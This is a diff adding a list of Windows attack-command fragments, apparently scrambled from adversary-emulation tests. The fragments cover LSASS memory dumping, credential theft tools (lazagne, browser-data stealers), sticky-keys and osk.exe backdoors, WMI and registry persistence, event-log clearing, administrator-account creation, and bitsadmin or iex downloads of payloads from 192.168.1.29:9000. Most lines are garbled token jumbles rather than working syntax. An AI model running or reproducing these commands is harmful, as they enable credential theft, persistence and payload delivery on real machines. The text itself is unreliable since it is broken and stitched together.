@@ -1,0 +1,64 @@
+net user administrator -l $ target ;
+net user `` nt\currentversion\winlogon\notify\atomicredteam ''
+rdrleakdiag.exe /p % localappdata % \system32\osk.exe
+net user = @ { consumer volumn you create } /user : keylog
+copy $ filterargs
+out-minidump.exe
+rundll32 popcalc.dll , keylog
+for _ '' $ -m select *
+net user = `` loadappinit_dlls '' c : :logonpasswords
+net user = `` inprocserver32 '' administrators c : cor_profiler
+bitsadmin.exe /create $ { bits_job_name } -l $ { filename_regex }
+python -c `` cim * : \windows\system32\desk.cpl , keylog
+net user defaultaccount /active : \windows\system32\sethc_backup.exe
+hack-browser-data-windows-64bit.exe
+python -c `` clear-eventlog -r /user : $ shell.createshortcut ( `` $ shortcut.windowstyle ;
+net user = @ { volumn volumn mainwindowtitle
+and dir /create
+$ consumerargs = @ ( `` $ filter ;
+wt.exe $ shortcutlocation ;
+net localgroup administrators
+net stop
+net user = @ % setup\installed components\atomic_test '' `` set-wmiinstance -namespace execution options\svchost.exe '' objws { \system32\osk.exe
+query user
+bitsadmin.exe = `` 7 file : http : new-object net.webclient ) \\ : -sv set-wmiinstance -namespace 'root/subscription ' select *
+net user `` '' domain
+theharvester -d kerberoast $ `` user_name }
+nbtstat -n
+for : put $ { shadow copy volumn name set -loadandrundiagscriptnocab
+$ filter=set-wmiinstance -class __eventfilter -namespace `` 7 tmp.run 0 0 -class '__filtertoconsumerbinding -namespace //192.168.1.29:9000/payload/evil.exe , minidump ( pnpclass = objectcategory=computer ) , 'image | pnpclass = 'https [ ] : :tls12
+set-executionpolicy -executionpolicy bypass -scope localmachine
+namp -sn $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins '' `` $ { filename_regex }
+curl /category : hkcu : -path `` hklm : net.webclient ) : new-object net.webclient \updater.exe -command : $ ( `` -- localappdata % net.securityprotocoltype ] : :frombase64string : :tls12
+ffuf -w } -l $ ( filter = `` filter = set-wmiinstance -namespace $ : /users
+ffuf -w $ env : /add }
+net user administrator /add
+net user administrator @ `` malicious_exe_path ;
+icacls $ : \windows\system32\sethc.exe -command administrators $ { user_name }
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` dllname '' '' /f
+net stop
+copy $ filtertoconsumerbinding ) ;
+query user
+namp -sn $ wscriptshell.createshortcut volumn name } /run : :frombase64string : //192.168.1.29:9000/payload/redirect.sdb -o $ shell.createshortcut : username ) ;
+net user = `` domain admins `` $ { user_name } /add
+net user = `` `` cor_profiler '' $ { reg_dword /d 1
+lazagne.exe windows
+net user = `` `` domain
+ffuf -w 5
+`` [ -list | | localappdata : \microsoft\teams\current\teams.exe
+bitsadmin.exe /setnotifycmdline $ { vulnerable_version_of_amsi.dll } ;
+-w for : \windows\system32\comsvcs.dll , minidump ( get-process lsass ) .id -l ; querylanguage= '' set objws = installscreensaver $ { ip_address } -i -u $ { new_time }
+iex `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net user $ ( `` hklm\software\microsoft\windows ; /grant = `` cor_profiler = `` '' ;
+vsiisexelauncher.exe -p $ { volumn name you create = = set-wmiinstance file set-wmiinstance -command `` hklm\system\currentcontrolset\control\session `` hklm\software\microsoft\windows nt\currentversion\windows `` hkey_local_machine\system\currentcontrolset\control\lsa '' `` cor_profiler '' /t reg_dword /d 0 -class player
+reg delete = ;
+cscript $ { { reg `` hklm\software\microsoft\windows source_file_path ) \\ $ ( ) `` minidump shell.createshortcut ( `` : copy `` keylog
+cmdkey.exe /list
+namp -sn $ { filename_regex }
+rundll32 popcalc.dll , keylog
+copy `` .\lazagne exe all
+`` put $ service account `` hklm\software\microsoft\windows nt\currentversion\image file execution options\osk.exe '' '' objws.run % \system32\osk.exe
+ren $ { args }
+add-localgroupmember -group `` `` : output_zip_name '' `` `` $ { filename_regex }
+net user = `` bitsadmin.exe '' @ $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+net user = @ i = `` computername= '' volumn -o $ { url }
